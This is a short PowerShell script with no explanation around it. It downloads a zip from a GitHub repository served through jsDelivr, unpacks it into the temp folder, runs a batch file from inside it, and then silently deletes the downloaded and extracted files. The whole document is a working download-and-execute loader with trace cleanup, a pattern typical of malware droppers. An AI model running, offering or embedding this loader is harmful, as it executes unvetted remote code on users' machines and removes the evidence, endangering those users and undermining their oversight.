[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
$zipUrl = "https://cdn.jsdelivr.net/gh/rtcp-stu/rtools@main/jet/pkg.zip"
$zipPath = Join-Path $env:TEMP "jet_pkg.zip"
$outDir = Join-Path $env:TEMP "jet_run"

irm $zipUrl -OutFile $zipPath
Expand-Archive -Path $zipPath -DestinationPath $outDir -Force
Set-Location $outDir
Start-Process cmd.exe -ArgumentList "/c index.bat" -Wait -NoNewWindow

Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
Remove-Item $outDir -Recurse -Force -ErrorAction SilentlyContinue
